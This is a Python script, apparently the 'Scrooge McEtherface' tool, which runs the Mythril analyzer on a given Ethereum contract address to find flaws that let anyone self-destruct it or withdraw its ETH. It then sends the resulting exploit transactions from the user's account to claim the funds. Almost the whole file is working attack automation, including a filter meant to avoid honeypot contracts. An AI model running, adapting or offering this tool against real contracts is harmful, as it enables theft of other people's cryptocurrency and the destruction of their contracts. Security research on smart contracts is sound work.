#!/usr/bin/env python

import os
import re
import sys
import json
import logging
from mythril.mythril import Mythril
from web3 import Web3, HTTPProvider
from configparser import ConfigParser
from enum import Enum

# Uncomment the line below to get verbose logging.
# logging.basicConfig(level=logging.INFO)


class InvulnerableError(Exception):
    pass


class VulnType(Enum):
    KILL_ONLY = 0
    KILL_AND_WITHDRAW = 1
    ETHER_THEFT = 2


class Vulnerability:
    def __init__(self, type, description, transactions):

        self.type = type
        self.description = description
        self.transactions = transactions


# Utility functions


def critical(message):
    logging.error(message)
    sys.exit()


def w3_request_blocking(sender, receiver, data):
    tx_hash = w3.eth.sendTransaction(
        {"to": receiver, "from": sender, "data": data, "gas": 1000000}
    )

    print(
        "Transaction sent successfully (%s). Waiting for transcation to be mined..."
        % tx_hash.hex()
    )
    tx_hash = w3.eth.waitForTransactionReceipt(tx_hash, timeout=120)

    return tx_hash


def get_vulnerabilities(target_address):
    myth = Mythril(enable_online_lookup=False, onchain_storage_access=True)
    myth.set_api_rpc(rpc[7:])
    myth.load_from_address(target_address)

    report = myth.fire_lasers(
        strategy="dfs",
        modules=["ether_thief", "suicide"],
        address=target_address,
        execution_timeout=45,
        max_depth=22,
        transaction_count=2,
        verbose_report=True,
    )

    nIssues = len(report.issues)

    if nIssues == 0:
        raise (InvulnerableError)

    vulns = []

    for i in range(0, nIssues):
        issue = report.sorted_issues()[i]

        tx = issue["debug"].replace("\n", " ").replace("'", '"')
        transactions = json.loads(tx)

        if re.search(r"call_value': '0x[0]*[1-9a-fA-F]", str(transactions)):
            # Honeypot prevention.
            # We might miss issues that require small amounts of ETH to be sent,
            # but better err on the safe side.
            logging.info("Ignoring transaction sequence that requires sending of ETH.")
            continue

        if "withdraw its balance" in issue["description"]:
            _type = VulnType.KILL_AND_WITHDRAW
            description = "Anybody can kill this contract and steal its balance."
        elif "withdraw ETH" in issue["description"]:
            _type = VulnType.ETHER_THEFT
            description = "Anybody can withdraw ETH from this contract."
        else:
            _type = VulnType.KILL_ONLY
            description = "Anybody can kill this contract."

        vulns.append(Vulnerability(_type, description, transactions))

    if len(vulns):
        return vulns

    raise (InvulnerableError)


def commence_attack(sender_address, target_address, vuln):
    print(vuln.description)

    for id, tx in vuln.transactions.items():
        data = tx["calldata"].replace(
            "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", sender_address[2:]
        )

        print(
            "You are about to send the following transaction:\nFrom: %s, To: %s, Value: 0\nData: %s"
            % (sender_address, target_address, str(tx["calldata"]))
        )
        response = input("Are you sure you want to proceed (y/N)?\n")

        if response == "y":
            try:
                w3_request_blocking(sender_address, target_address, data)
            except Exception as e:
                print("Error sending transaction: %s" % str(e))

        else:
            sys.exit()


# Read the config

config_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "config.ini")

try:
    config = ConfigParser()
    config.optionxform = str
    config.read(config_path, "utf-8")

    sender_address = Web3.toChecksumAddress(config["settings"]["sender"])
    rpc = config["settings"]["rpc"]
except KeyError:
    critical("Missing or invalid configuration file. See config.ini.example.")
except ValueError as e:
    critical("Invalid Ethereum address: " + config["settings"]["sender"])

try:
    target_address = Web3.toChecksumAddress(sys.argv[1])
except IndexError:
    critical("Usage: scrooge <target_address>")
except ValueError as e:
    critical("Invalid Ethereum address: " + sys.argv[1])

# MAIN

w3 = Web3(HTTPProvider(rpc))

print("Scrooge McEtherface at your service.")

balance = w3.eth.getBalance(sender_address)
eth = round(float(balance) / 1000000000000000000, 2)

print("Your initial account balance is %.02f ETH.\nCharging lasers..." % eth)

# FIXME: Handle multiple issues being returned

try:
    vuln = get_vulnerabilities(target_address)[0]
except InvulnerableError:
    print("No attack vector found.")
except Exception as e:
    print("Error during analysis: %s" % str(e))

target_balance = w3.eth.getBalance(target_address)

commence_attack(sender_address, target_address, vuln)

balance = w3.eth.getBalance(sender_address)
eth = round(float(balance) / 1000000000000000000, 2)

print("Your final account balance is %.02f ETH.\n" % eth)
